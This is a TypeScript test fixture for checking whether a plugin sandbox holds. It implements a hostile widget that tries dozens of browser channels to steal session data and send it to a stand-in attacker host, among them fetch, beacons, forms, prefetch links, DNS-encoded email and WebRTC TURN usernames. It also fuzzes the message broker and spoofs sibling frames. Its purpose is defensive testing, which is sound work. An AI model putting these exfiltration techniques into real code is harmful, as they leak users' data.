import { useEffect } from 'react'

/* A hostile plugin, written against the isolated runtime but built to misbehave.
 *
 * It is test code and not a model of anything. Each function below is one attempt from ADR 0005's threat
 * model (or a channel the spike found open). The runner (../run.ts) calls them by name through
 * `window.__hostile`, from outside the page, and judges the result with evidence the plugin cannot forge:
 * what an attacker-controlled server received, what the API received, and what the browser logged.
 *
 * The plugin's own report ("blocked", "allowed") is a hint for a human reading the log, never the verdict. */

interface Ctx {
  session: { userId: string; email: string; timezone: string }
  api: {
    get(path: string, init?: RequestInit): Promise<unknown>
    post(path: string, body?: unknown, init?: RequestInit): Promise<unknown>
    put(path: string, body?: unknown, init?: RequestInit): Promise<unknown>
    del(path: string, init?: RequestInit): Promise<unknown>
  }
  navigate(path: string): void
}

interface Violation { directive: string; blocked: string; disposition: string }
type Json = Record<string, unknown>

export interface RawRequest { method: string; path: string; body?: unknown; cache?: string; extra?: Json }
export interface RawReply { sent: Json; reply: unknown }

declare global {
  interface Window { __hostile?: Hostile }
}

const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms))
const message = (e: unknown): string => (e instanceof Error ? `${e.name}: ${e.message}` : String(e)).slice(0, 220)
const errorInfo = (e: unknown): Json => ({
  threw: true,
  name: e instanceof Error ? e.name : typeof e,
  message: message(e),
  ...(typeof (e as { code?: unknown } | null)?.code === 'string' ? { code: (e as { code: string }).code } : {}),
  ...(typeof (e as { status?: unknown } | null)?.status === 'number' ? { status: (e as { status: number }).status } : {}),
})

class Hostile {
  cfg = { attacker: '', host: '', udpPort: 0 }
  readonly violations: Violation[] = []
  readonly windowMessages: Array<{ type: unknown; fromParent: boolean; ports: number; keys: string[] }> = []
  readonly fetchLog: string[] = []
  readonly seen: unknown[] = []
  private port: MessagePort | null = null
  private waiters = new Map<number, (m: unknown) => void>()
  private nextId = 9000
  portInits: unknown[] = []
  portClosedWatch = false

  constructor(readonly ctx: Ctx) {
    document.addEventListener('securitypolicyviolation', (e) => {
      this.violations.push({ directive: e.violatedDirective, blocked: e.blockedURI, disposition: e.disposition })
    })
    window.addEventListener('message', (e) => {
      const d = e.data as Json | null
      this.windowMessages.push({
        type: d !== null && typeof d === 'object' ? d['type'] : typeof d,
        fromParent: e.source === window.parent, ports: e.ports.length,
        keys: d !== null && typeof d === 'object' ? Object.keys(d) : [],
      })
    })
    // Wrap the frame's own fetch and XHR: the only traffic they ever see is the plugin's own.
    const realFetch = window.fetch.bind(window)
    window.fetch = ((input: RequestInfo | URL, init?: RequestInit) => {
      this.fetchLog.push(`fetch ${String(input instanceof Request ? input.url : input)} auth=${new Headers(init?.headers).get('authorization') ?? ''}`)
      return realFetch(input, init)
    }) as typeof window.fetch
    const realOpen = XMLHttpRequest.prototype.open
    XMLHttpRequest.prototype.open = function (this: XMLHttpRequest, method: string, url: string | URL, ...rest: unknown[]) {
      ;(window.__hostile as Hostile).fetchLog.push(`xhr ${method} ${String(url)}`)
      return (realOpen as (...a: unknown[]) => void).call(this, method, url, ...rest)
    } as typeof XMLHttpRequest.prototype.open
  }

  configure(cfg: { attacker: string; host: string; udpPort: number }): void { this.cfg = cfg }

  /** What the plugin legitimately holds and would like to take with it. */
  private loot(): string { return encodeURIComponent(JSON.stringify({ email: this.ctx.session.email, user: this.ctx.session.userId })) }
  private atk(id: string, path = ''): string { return `${this.cfg.attacker}/${id}${path}?hx=${id}&d=${this.loot()}` }
  private home(path: string, id: string): string { return `${this.cfg.host}${path}${path.includes('?') ? '&' : '?'}hx=${id}` }

  private async settle<T extends Json>(run: () => Promise<T> | T, waitMs = 400): Promise<Json> {
    const from = this.violations.length
    let out: Json
    try { out = await run() } catch (e) { out = errorInfo(e) }
    await sleep(waitMs)
    return { ...out, violations: this.violations.slice(from) }
  }

  // ---- Credentials: can the plugin find the host's token anywhere in reach?

  async reachForCredentials(secrets: string[]): Promise<Json> {
    const probe = async (fn: () => unknown): Promise<string> => {
      try { const v = await fn(); return `allowed:${typeof v === 'string' ? v.slice(0, 40) : typeof v}` } catch (e) { return `blocked ${message(e)}` }
    }
    const out: Json = {
      origin: self.origin,
      cookie: await probe(() => document.cookie),
      localStorage: await probe(() => localStorage.getItem('x')),
      localStorageWrite: await probe(() => localStorage.setItem('x', 'y')),
      sessionStorage: await probe(() => sessionStorage.getItem('x')),
      indexedDB: await probe(() => new Promise((res, rej) => { const r = indexedDB.open('x'); r.onsuccess = () => res('opened'); r.onerror = () => rej(r.error) })),
      cacheStorage: await probe(() => caches.open('x')),
      serviceWorker: await probe(() => navigator.serviceWorker.register('/sw.js')),
      parentDocument: await probe(() => window.parent.document.title),
      parentCookie: await probe(() => (window.parent.document as Document).cookie),
      parentLocalStorage: await probe(() => (window.parent as unknown as { localStorage: Storage }).localStorage.length),
      parentFetch: await probe(() => (window.parent as unknown as { fetch: unknown }).fetch),
      parentWindowKeys: await probe(() => Object.keys(window.parent).join(',')),
      topHref: await probe(() => (window.top as Window).location.href),
      parentModuleVar: await probe(() => (window.parent as unknown as Json)['__WM_ACCESS_TOKEN__']),
      openerIsNull: window.opener === null,
      referrer: document.referrer,
      windowName: window.name,
      hash: location.hash,
    }
    // Everything the frame can enumerate about itself, searched for the host's and the plugin's own tokens
    // and for anything shaped like a JWT.
    const haystack = [
      document.documentElement.outerHTML, location.href, document.referrer, window.name,
      JSON.stringify(this.windowMessages), JSON.stringify(this.portInits), JSON.stringify(this.seen),
      JSON.stringify(Object.keys(window)), JSON.stringify(Object.keys(this.ctx)), JSON.stringify(Object.keys(this.ctx.api)),
      JSON.stringify(performance.getEntries().map((e) => e.name)), this.fetchLog.join('\n'),
      String(this.ctx.api.get), String(this.ctx.navigate),
    ].join('\n')
    out['jwtShapedStrings'] = (haystack.match(/eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\./g) ?? []).length
    out['secretsFound'] = secrets.filter((s) => s.length > 20 && haystack.includes(s)).length
    out['ctxKeys'] = Object.keys(this.ctx).sort()
    out['apiKeys'] = Object.keys(this.ctx.api).sort()
    out['authHeadersSeenByWrappedFetch'] = this.fetchLog.filter((l) => /auth=Bearer/i.test(l)).length
    return out
  }

  // ---- Network from the frame itself.

  fetchRefresh = (): Promise<Json> => this.settle(() => fetch(this.home('/api/v1/auth/refresh', 'fetch-refresh'), { method: 'POST', credentials: 'include', headers: { 'x-wickermoney-csrf': '1' } }).then((r) => ({ status: r.status })))
  fetchExport = (): Promise<Json> => this.settle(() => fetch(this.home('/api/v1/settings/export', 'fetch-export'), { credentials: 'include' }).then((r) => ({ status: r.status })))
  fetchHostApiNoCors = (): Promise<Json> => this.settle(() => fetch(this.home('/api/v1/auth/me', 'fetch-host-nocors'), { mode: 'no-cors' }).then((r) => ({ type: r.type })))
  fetchAttacker = (): Promise<Json> => this.settle(() => fetch(this.atk('fetch-attacker'), { mode: 'no-cors', credentials: 'include' }).then((r) => ({ type: r.type })))
  fetchAttackerKeepalive = (): Promise<Json> => this.settle(() => fetch(this.atk('fetch-keepalive'), { mode: 'no-cors', keepalive: true, method: 'POST', body: this.loot() }).then((r) => ({ type: r.type })))
  xhrExport = (): Promise<Json> => this.settle(() => this.xhr(this.home('/api/v1/settings/export', 'xhr-export')))
  xhrAttacker = (): Promise<Json> => this.settle(() => this.xhr(this.atk('xhr-attacker')))
  private xhr(url: string): Promise<Json> {
    return new Promise((resolve) => {
      const x = new XMLHttpRequest()
      x.onload = () => { resolve({ status: x.status }) }
      x.onerror = () => { resolve({ error: 'xhr error event', status: x.status }) }
      x.open('GET', url)
      x.withCredentials = true
      x.send()
    })
  }
  webSocketAttacker = (): Promise<Json> => this.settle(() => this.ws(this.atk('ws-attacker').replace(/^http/, 'ws')))
  webSocketHost = (): Promise<Json> => this.settle(() => this.ws(this.home('/api/v1/auth/refresh', 'ws-host').replace(/^http/, 'ws')))
  private ws(url: string): Promise<Json> {
    return new Promise((resolve) => {
      let opened = false
      const s = new WebSocket(url)
      s.onopen = () => { opened = true }
      s.onerror = () => { resolve({ error: 'websocket error event', opened }) }
      s.onclose = (e) => { resolve({ closed: e.code, opened }) }
      setTimeout(() => { resolve({ timeout: true, opened }) }, 1500)
    })
  }
  beaconAttacker = (): Promise<Json> => this.settle(() => ({ queued: navigator.sendBeacon(this.atk('beacon-attacker'), this.loot()) }))
  beaconHostRefresh = (): Promise<Json> => this.settle(() => ({ queued: navigator.sendBeacon(this.home('/api/v1/auth/refresh', 'beacon-host-refresh'), '{}') }))
  imageAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const i = new Image(); i.src = this.atk('image-attacker'); return i }))
  imageHost = (): Promise<Json> => this.settle(() => this.load(() => { const i = new Image(); i.src = this.home('/api/v1/auth/me', 'image-host'); return i }))
  private load(make: () => HTMLElement): Promise<Json> {
    return new Promise((resolve) => {
      const el = make()
      el.onload = () => { resolve({ loaded: true }) }
      el.onerror = () => { resolve({ error: 'load error event' }) }
      setTimeout(() => { resolve({ timeout: true }) }, 1200)
    })
  }
  cssUrlAttacker = (): Promise<Json> => this.settle(() => {
    const s = document.createElement('style')
    s.textContent = `body{background:url(${this.atk('css-attacker')})} @import url(${this.atk('css-import')});`
    document.head.appendChild(s)
    return { appended: true }
  })
  scriptAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const s = document.createElement('script'); s.src = this.atk('script-attacker'); document.head.appendChild(s); return s }))
  scriptTagHostApi = (): Promise<Json> => this.settle(() => this.load(() => { const s = document.createElement('script'); s.src = this.home('/api/v1/settings/export', 'script-host-export'); document.head.appendChild(s); return s }))
  stylesheetAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = this.atk('stylesheet-attacker'); document.head.appendChild(l); return l }))
  iframeAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const f = document.createElement('iframe'); f.src = this.atk('iframe-attacker'); document.body.appendChild(f); return f }))
  iframeHostApi = (): Promise<Json> => this.settle(() => this.load(() => { const f = document.createElement('iframe'); f.src = this.home('/api/v1/auth/me', 'iframe-host'); document.body.appendChild(f); return f }))
  objectAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const o = document.createElement('object'); o.data = this.atk('object-attacker'); document.body.appendChild(o); return o }))
  embedAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const o = document.createElement('embed'); o.src = this.atk('embed-attacker'); document.body.appendChild(o); return o }))
  eventSourceAttacker = (): Promise<Json> => this.settle(() => new Promise<Json>((resolve) => { const e = new EventSource(this.atk('eventsource-attacker')); e.onerror = () => { e.close(); resolve({ error: 'eventsource error event' }) }; setTimeout(() => { resolve({ timeout: true }) }, 1200) }))
  workerAttacker = (): Promise<Json> => this.settle(() => new Promise<Json>((resolve) => { const w = new Worker(this.atk('worker-attacker')); w.onerror = () => { resolve({ error: 'worker error event' }) }; setTimeout(() => { resolve({ timeout: true }) }, 1200) }))
  workerBlob = (): Promise<Json> => this.settle(() => new Promise<Json>((resolve) => {
    const w = new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(this.atk('worker-blob-fetch'))},{mode:'no-cors'}); postMessage('ran')`], { type: 'text/javascript' })))
    w.onerror = () => { resolve({ error: 'worker error event' }) }
    w.onmessage = () => { resolve({ ran: true }) }
    setTimeout(() => { resolve({ timeout: true }) }, 1200)
  }))
  importAttacker = (): Promise<Json> => this.settle(() => import(/* @vite-ignore */ this.atk('import-attacker')).then(() => ({ imported: true })))
  fontAttacker = (): Promise<Json> => this.settle(() => new FontFace('x', `url(${this.atk('font-attacker')})`).load().then(() => ({ loaded: true })))
  mediaAttacker = (): Promise<Json> => this.settle(() => this.load(() => { const a = new Audio(); a.src = this.atk('media-attacker'); a.load(); return a }))
  // Run from a timer, not from the runner's call: a call made over the DevTools protocol is allowed to eval even where the
  // page's policy forbids it, which would make this attempt succeed for a reason a real plugin does not have.
  private fromTimer(run: () => string): Promise<Json> {
    return new Promise((resolve) => { setTimeout(() => { try { resolve({ value: run() }) } catch (e) { resolve(errorInfo(e)) } }, 0) })
  }
  evalCode = (): Promise<Json> => this.settle(() => this.fromTimer(() => String(eval('1+1'))))
  newFunction = (): Promise<Json> => this.settle(() => this.fromTimer(() => String(new Function('return 2+2')())))
  inlineScript = (): Promise<Json> => this.settle(() => {
    const s = document.createElement('script')
    s.textContent = `fetch(${JSON.stringify(this.atk('inline-script'))}, {mode:'no-cors'})`
    document.head.appendChild(s)
    return { appended: true }
  })
  inlineHandler = (): Promise<Json> => this.settle(() => {
    const i = document.createElement('img')
    i.setAttribute('onerror', `fetch(${JSON.stringify(this.atk('inline-handler'))}, {mode:'no-cors'})`)
    i.src = 'data:image/gif;base64,INVALID'
    document.body.appendChild(i)
    return { appended: true }
  })
  baseTagRedirect = (): Promise<Json> => this.settle(() => {
    const b = document.createElement('base'); b.href = `${this.cfg.attacker}/base-tag/`
    document.head.appendChild(b)
    return this.load(() => { const i = new Image(); i.src = 'pixel.gif?hx=base-tag'; return i })
  })

  // ---- Forms, navigation, windows and popups.

  private form(target: string, action: string): Json {
    const f = document.createElement('form')
    f.method = 'POST'; f.action = action; f.target = target
    const i = document.createElement('input'); i.name = 'd'; i.value = this.loot(); f.appendChild(i)
    document.body.appendChild(f)
    f.submit()
    return { submitted: true }
  }
  formAttackerSelf = (): Promise<Json> => this.settle(() => this.form('_self', this.atk('form-attacker-self')))
  formAttackerBlank = (): Promise<Json> => this.settle(() => this.form('_blank', this.atk('form-attacker-blank')))
  formAttackerTop = (): Promise<Json> => this.settle(() => this.form('_top', this.atk('form-attacker-top')))
  formHostRefresh = (): Promise<Json> => this.settle(() => this.form('_self', this.home('/api/v1/auth/refresh', 'form-host-refresh')))
  topNavAttacker = (): Promise<Json> => this.settle(() => { ;(window.top as Window).location.href = this.atk('top-nav-attacker'); return { assigned: true } })
  topNavHostApi = (): Promise<Json> => this.settle(() => { ;(window.top as Window).location.href = this.home('/api/v1/auth/me', 'top-nav-host'); return { assigned: true } })
  parentLocationAttacker = (): Promise<Json> => this.settle(() => { ;(window.parent as Window).location.replace(this.atk('parent-location-attacker')); return { assigned: true } })
  windowOpenAttacker = (): Promise<Json> => this.settle(() => ({ opened: window.open(this.atk('window-open-attacker'), '_blank') !== null }))
  windowOpenNamed = (): Promise<Json> => this.settle(() => ({ opened: window.open(this.atk('window-open-named'), 'evil', 'noopener') !== null }))
  windowOpenBlank = (): Promise<Json> => this.settle(() => ({ opened: window.open('about:blank', '_blank') !== null }))
  anchorBlank = (): Promise<Json> => this.settle(() => this.click({ href: this.atk('anchor-blank'), target: '_blank' }))
  anchorTop = (): Promise<Json> => this.settle(() => this.click({ href: this.atk('anchor-top'), target: '_top' }))
  anchorParent = (): Promise<Json> => this.settle(() => this.click({ href: this.atk('anchor-parent'), target: '_parent' }))
  anchorPing = (): Promise<Json> => this.settle(() => this.click({ href: '#ping', ping: this.atk('anchor-ping') }))
  private click(attrs: Record<string, string>): Json {
    const a = document.createElement('a')
    for (const [k, v] of Object.entries(attrs)) a.setAttribute(k, v)
    a.textContent = 'x'
    document.body.appendChild(a)
    a.click()
    return { clicked: true }
  }
  metaRefreshAttacker = (): Promise<Json> => this.settle(() => {
    const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = `0;url=${this.atk('meta-refresh-attacker')}`
    document.head.appendChild(m)
    return { appended: true }
  }, 800)
  siblingNavigation = (): Promise<Json> => this.settle(() => {
    const frames = Array.from({ length: (window.parent.length) }, (_, i) => window.parent.frames[i])
    let tried = 0
    for (const f of frames) {
      if (f === window) continue
      try { f!.location.href = this.atk('sibling-navigation'); tried += 1 } catch (e) { return { threw: true, name: (e as Error).name, message: message(e), tried } }
    }
    return { tried, frames: frames.length }
  })
  /** Navigates this frame itself. Destructive: the runner reloads the page afterwards. */
  selfNavAttacker = (): Promise<Json> => this.settle(() => { location.href = this.atk('self-nav-attacker'); return { assigned: true } }, 900)
  selfNavHost = (): Promise<Json> => this.settle(() => { location.href = this.home('/api/v1/auth/me', 'residual-self-nav-host') + '&d=' + this.loot(); return { assigned: true } }, 900)

  // ---- Channels the content security policy does not govern (ADR 0005, "P3 spike results").

  private link(rel: string, href: string, as?: string): Json {
    const l = document.createElement('link'); l.rel = rel; l.href = href
    if (as !== undefined) l.as = as
    document.head.appendChild(l)
    return { appended: rel }
  }
  prerender = (): Promise<Json> => this.settle(() => this.link('prerender', this.atk('residual-prerender')), 2500)
  prefetch = (): Promise<Json> => this.settle(() => this.link('prefetch', this.atk('residual-prefetch'), 'fetch'), 2500)
  preload = (): Promise<Json> => this.settle(() => this.link('preload', this.atk('residual-preload'), 'fetch'), 2500)
  modulePreload = (): Promise<Json> => this.settle(() => this.link('modulepreload', this.atk('residual-modulepreload')), 2500)
  preconnect = (): Promise<Json> => this.settle(() => this.link('preconnect', `${this.cfg.attacker}`), 2500)
  /** A host name that spells the data: the one thing a DNS lookup can carry. */
  dnsPrefetch = (): Promise<Json> => this.settle(() => {
    const hex = Array.from(new TextEncoder().encode(this.ctx.session.email)).map((b) => b.toString(16).padStart(2, '0')).join('').slice(0, 40)
    return this.link('dns-prefetch', `//hxdns-${hex}.attacker.test`)
  }, 2500)
  /** A TURN server the page names, with a username the page chose: the datagram that comes back carries the data. */
  webRtcTurn = (): Promise<Json> => this.settle(async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: `turn:127.0.0.1:${this.cfg.udpPort}?transport=udp`, username: JSON.stringify({ email: this.ctx.session.email }), credential: 'x' }] })
    pc.createDataChannel('x')
    await pc.setLocalDescription(await pc.createOffer())
    await sleep(3000)
    pc.close()
    return { gathered: true }
  }, 300)
  webRtc = (): Promise<Json> => this.settle(async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${this.cfg.udpPort}` }], iceCandidatePoolSize: 1 })
    pc.createDataChannel('x')
    await pc.setLocalDescription(await pc.createOffer())
    await sleep(2500)
    pc.close()
    return { gathered: true }
  }, 300)

  // ---- The broker, through the SDK client and then through a raw port.

  /** Requests through `ctx.api`, one at a time with a pause so the broker's rate limit is not the thing under test. */
  async sdk(list: Array<{ method: 'get' | 'post' | 'put' | 'del'; path: string; body?: unknown; init?: RequestInit }>, gapMs = 80): Promise<Json[]> {
    const out: Json[] = []
    for (const r of list) {
      try {
        const value = r.method === 'get' || r.method === 'del' ? await this.ctx.api[r.method](r.path, r.init) : await this.ctx.api[r.method](r.path, r.body, r.init)
        out.push({ ok: true, value: JSON.stringify(value).slice(0, 120) })
      } catch (e) { out.push(errorInfo(e)) }
      await sleep(gapMs)
    }
    return out
  }

  /** Says hello again and keeps the port the host sends, so the broker can be spoken to without the SDK in the way. */
  async takePort(): Promise<Json> {
    return new Promise<Json>((resolve) => {
      const timer = setTimeout(() => { window.removeEventListener('message', onMsg); resolve({ error: 'no port' }) }, 4000)
      const onMsg = (e: MessageEvent): void => {
        const d = e.data as Json | null
        if (e.source !== window.parent || d === null || d['type'] !== 'wm.connect' || e.ports[0] === undefined) return
        clearTimeout(timer)
        window.removeEventListener('message', onMsg)
        this.useRaw(e.ports[0])
        this.port?.postMessage({ type: 'ready', protocol: 1 })
        void sleep(500).then(() => { resolve({ port: true, inits: this.portInits.length }) })
      }
      window.addEventListener('message', onMsg)
      window.parent.postMessage({ type: 'wm.hello', protocols: [1], pluginId: 'wickermoney.budgets', session: { email: 'forged@attacker.test' } }, '*')
    })
  }
  private useRaw(port: MessagePort): void {
    this.port = port
    this.waiters = new Map()
    this.portInits = []
    port.onmessage = (e: MessageEvent) => {
      const d = e.data as Json | null
      this.seen.push(d)
      if (d !== null && typeof d === 'object' && d['type'] === 'init') this.portInits.push(d)
      if (d !== null && typeof d === 'object' && typeof d['id'] === 'number') this.waiters.get(d['id'])?.(d)
    }
  }
  /** Sends one message on the raw port and waits for the answer to its id (or for silence). */
  private async rawSend(msg: Json, waitMs = 700): Promise<unknown> {
    const port = this.port
    if (port === null) return { error: 'no port' }
    const id = (msg as Json | null)?.['id']
    const wait = typeof id === 'number' ? new Promise<unknown>((resolve) => { this.waiters.set(id, resolve); setTimeout(() => { resolve({ silence: true }) }, waitMs) }) : sleep(waitMs).then(() => ({ silence: true }))
    try { port.postMessage(msg) } catch (e) { return errorInfo(e) }
    return wait
  }
  async raw(list: RawRequest[], gapMs = 70): Promise<RawReply[]> {
    const out: RawReply[] = []
    for (const r of list) {
      const id = this.nextId++
      const sent = { type: 'request', id, method: r.method, path: r.path, ...(r.body !== undefined ? { body: r.body } : {}), ...(r.cache !== undefined ? { cache: r.cache } : {}), ...(r.extra ?? {}) }
      out.push({ sent, reply: await this.rawSend(sent) })
      await sleep(gapMs)
    }
    return out
  }
  /** Arbitrary messages that are not requests. Each is a separate send. */
  async rawMessages(list: unknown[], gapMs = 30): Promise<Array<{ sent: unknown; reply: unknown }>> {
    const out: Array<{ sent: unknown; reply: unknown }> = []
    for (const m of list) {
      out.push({ sent: typeof m === 'object' ? m : String(m), reply: await this.rawSend(m as Json, 250) })
      await sleep(gapMs)
    }
    return out
  }
  /** Messages a sane client never sends. Each is its own send; the answer is the broker's, or silence. */
  async rawOddities(): Promise<Array<{ label: string; reply: unknown }>> {
    const big = new ArrayBuffer(2_000_000)
    const circular: Json = { type: 'request', id: 8801, method: 'POST', path: '/p/acme.hostile/x' }
    circular['body'] = circular
    let deep: Json = {}
    for (let i = 0; i < 20_000; i++) deep = { n: deep }
    const items: Array<[string, unknown]> = [
      ['null', null], ['number', 5], ['string', 'request'], ['array', []], ['empty object', {}],
      ['request without fields', { type: 'request' }],
      ['request, id is a string', { type: 'request', id: 'x', method: 'GET', path: '/core/transactions/monthly-summary' }],
      ['request, negative id', { type: 'request', id: -1, method: 'GET', path: '/core/transactions/monthly-summary' }],
      ['request, fractional id', { type: 'request', id: 1.5, method: 'GET', path: '/core/transactions/monthly-summary' }],
      ['request, unsafe integer id', { type: 'request', id: 2 ** 60, method: 'GET', path: '/core/transactions/monthly-summary' }],
      ['request, method PATCH', { type: 'request', id: 8802, method: 'PATCH', path: '/p/acme.hostile/x' }],
      ['request, method TRACE', { type: 'request', id: 8803, method: 'TRACE', path: '/p/acme.hostile/x' }],
      ['request, path is a number', { type: 'request', id: 8804, method: 'GET', path: 5 }],
      ['request, GET with a body', { type: 'request', id: 8805, method: 'GET', path: '/core/transactions/monthly-summary', body: { a: 1 } }],
      ['request, bad cache mode', { type: 'request', id: 8806, method: 'GET', path: '/core/transactions/monthly-summary', cache: 'force-cache' }],
      ['request, circular body', circular],
      ['request, body nested 20000 deep', { type: 'request', id: 8807, method: 'POST', path: '/p/acme.hostile/x', body: deep }],
      ['type __proto__', { type: '__proto__' }], ['type constructor', { type: 'constructor' }],
      ['host message: response', { type: 'response', id: 1, ok: true, value: 'x' }],
      ['host message: init', { type: 'init', protocol: 1, pluginId: 'wickermoney.budgets' }],
      ['host message: theme', { type: 'theme', theme: { scheme: 'dark', tokens: {} } }],
      ['window handshake message on the port', { type: 'wm.connect', protocol: 1 }],
      ['cancel, id is a string', { type: 'cancel', id: 'a' }],
      ['resize, NaN', { type: 'resize', height: Number.NaN }], ['resize, -1', { type: 'resize', height: -1 }],
      ['resize, Infinity', { type: 'resize', height: Infinity }],
      ['focus-out, bad direction', { type: 'focus-out', direction: 'sideways' }],
      ['notify, bad level', { type: 'notify', id: 8808, level: 'fatal', message: 'x' }],
      ['notify, 100 kB text', { type: 'notify', id: 8809, level: 'info', message: 'x'.repeat(100_000) }],
      ['notify, valid (reserved)', { type: 'notify', id: 8810, level: 'info', message: 'hello' }],
      ['2 MB ArrayBuffer', big], ['Blob', new Blob(['x'])], ['Date', new Date()], ['Map', new Map([['type', 'request']])],
    ]
    const out: Array<{ label: string; reply: unknown }> = []
    for (const [label, message] of items) {
      const id = (message as Json | null)?.['id']
      out.push({ label, reply: await this.rawSend(message as Json, typeof id === 'number' ? 400 : 120) })
      await sleep(25)
    }
    // Things the structured clone refuses to send at all: the browser stops these in the sender.
    for (const [label, make] of [['function', () => () => 1], ['symbol', () => Symbol('x')], ['DOM node', () => document.body], ['window', () => window]] as const) {
      try { this.port?.postMessage(make()); out.push({ label, reply: { sent: true } }) } catch (e) { out.push({ label, reply: errorInfo(e) }) }
    }
    return out
  }

  /** Sends `count` valid, distinct, granted reads as fast as the event loop allows. */
  async flood(count: number): Promise<Json> {
    const port = this.port
    if (port === null) return { error: 'no port' }
    const replies: Json[] = []
    const prior = port.onmessage
    port.onmessage = (e: MessageEvent) => { replies.push(e.data as Json); prior?.call(port, e) }
    for (let i = 0; i < count; i++) {
      try { port.postMessage({ type: 'request', id: 100_000 + i, method: 'GET', path: `/core/transactions/monthly-summary?months=1&flood=${i}`, cache: 'no-store' }) } catch { break }
    }
    await sleep(2500)
    const codes: Record<string, number> = {}
    for (const r of replies) {
      const key = r['ok'] === true ? 'ok' : String((r['error'] as Json | undefined)?.['code'] ?? 'other') + ':' + String((r['error'] as Json | undefined)?.['status'] ?? '')
      codes[key] = (codes[key] ?? 0) + 1
    }
    return { sent: count, replies: replies.length, codes }
  }
  /** `count` valid reads at one every `everyMs`: faster than the sustained rate, slower than the burst that ends the connection. */
  async paced(count: number, everyMs: number): Promise<Json> {
    const port = this.port
    if (port === null) return { error: 'no port' }
    const replies: Json[] = []
    const prior = port.onmessage
    port.onmessage = (e: MessageEvent) => { replies.push(e.data as Json); prior?.call(port, e) }
    const t0 = performance.now()
    for (let i = 0; i < count; i++) { port.postMessage({ type: 'request', id: 200_000 + i, method: 'GET', path: `/core/transactions/monthly-summary?months=1&paced=${i}`, cache: 'no-store' }); await sleep(everyMs) }
    const sentMs = Math.round(performance.now() - t0)
    await sleep(1500)
    const codes: Record<string, number> = {}
    for (const r of replies) { const key = r['ok'] === true ? 'ok' : `${String((r['error'] as Json | undefined)?.['code'])}:${String((r['error'] as Json | undefined)?.['status'] ?? '')}`; codes[key] = (codes[key] ?? 0) + 1 }
    return { sent: count, sentMs, replies: replies.length, codes }
  }
  /** Says hello `count` times in a row. */
  async helloFlood(count: number): Promise<Json> {
    let connects = 0
    const onMsg = (e: MessageEvent): void => { if ((e.data as Json | null)?.['type'] === 'wm.connect' && e.source === window.parent) connects += 1 }
    window.addEventListener('message', onMsg)
    for (let i = 0; i < count; i++) { window.parent.postMessage({ type: 'wm.hello', protocols: [1], pluginId: 'wickermoney.budgets', session: { email: 'forged@attacker.test' } }, '*'); await sleep(40) }
    await sleep(600)
    window.removeEventListener('message', onMsg)
    return { hellos: count, connects }
  }
  /** After a raw send, does the port still answer? */
  async portAlive(): Promise<boolean> {
    const r = (await this.raw([{ method: 'GET', path: '/p/acme.hostile/ping' }], 0))[0]?.reply as Json | undefined
    return r !== undefined && r['type'] === 'response'
  }

  // ---- Navigation requests to the host (page frames have `ctx.navigate`).

  /** One `ctx.navigate`, with `{loot}` replaced by the session data. The frame is usually gone a moment later. */
  navOne(path: string): Json {
    try { this.ctx.navigate(path.replace('{loot}', this.loot())); return { returned: true } } catch (e) { return errorInfo(e) }
  }
  navBurst(count: number): number { let sent = 0; for (let i = 0; i < count; i++) { this.ctx.navigate(`/accounts?burst=${i}`); sent += 1 } return sent }

  // ---- Spoofing a sibling frame (and the host) from a frame that is not the host.

  private spoofTimer: ReturnType<typeof setInterval> | null = null
  spoofSiblings(durationMs: number): void {
    const forged = (port: MessagePort): Json[] => {
      port.postMessage({ type: 'init', protocol: 1, pluginId: 'acme.hostile', kind: 'widget', session: { userId: 'forged', email: 'forged@attacker.test', timezone: 'UTC' }, locale: { locale: 'en-US', timezone: 'UTC' }, theme: { scheme: 'dark', tokens: { '--wm-bg': '#ff0000' } } })
      port.postMessage({ type: 'theme', theme: { scheme: 'dark', tokens: { '--wm-bg': '#ff0000' } } })
      port.postMessage({ type: 'props', size: 'full' })
      port.postMessage({ type: 'response', id: 1, ok: true, value: 'FORGED' })
      return []
    }
    const t0 = Date.now()
    this.spoofTimer = setInterval(() => {
      if (Date.now() - t0 > durationMs) { if (this.spoofTimer !== null) clearInterval(this.spoofTimer); return }
      for (let i = 0; i < window.parent.length; i++) {
        const sibling = window.parent.frames[i]
        if (sibling === undefined || sibling === window) continue
        const ch = new MessageChannel()
        forged(ch.port2)
        try {
          sibling.postMessage({ type: 'wm.connect', protocol: 1 }, '*', [ch.port1])
          sibling.postMessage({ type: 'wm.refuse', supported: [99] }, '*')
          sibling.postMessage({ type: 'wm.hello', protocols: [1] }, '*')
        } catch { /* a closed frame */ }
      }
    }, 12)
  }
  stopSpoof(): void { if (this.spoofTimer !== null) clearInterval(this.spoofTimer) }
  windowMessageCounts(): Json {
    const count = (type: string, fromParent?: boolean): number =>
      this.windowMessages.filter((m) => m.type === type && (fromParent === undefined || m.fromParent === fromParent)).length
    return {
      connectFromParent: count('wm.connect', true), connectFromOthers: count('wm.connect', false),
      refuseFromOthers: count('wm.refuse', false), helloFromOthers: count('wm.hello', false),
    }
  }
}

/** The widget that attacks. */
export default function HostileWidget({ ctx }: { ctx: Ctx }) {
  useEffect(() => {
    if (window.__hostile !== undefined) return
    const h = new Hostile(ctx)
    window.__hostile = h
    // A hostile plugin does not wait to be asked: start spoofing the neighbours at mount, while they are still
    // connecting. The runner reads what the victim made of it.
    h.spoofSiblings(4000)
  }, [ctx])
  return <section><h3>Hostile widget</h3><p id="who">{ctx.session.email}</p><button id="first" type="button">first</button></section>
}
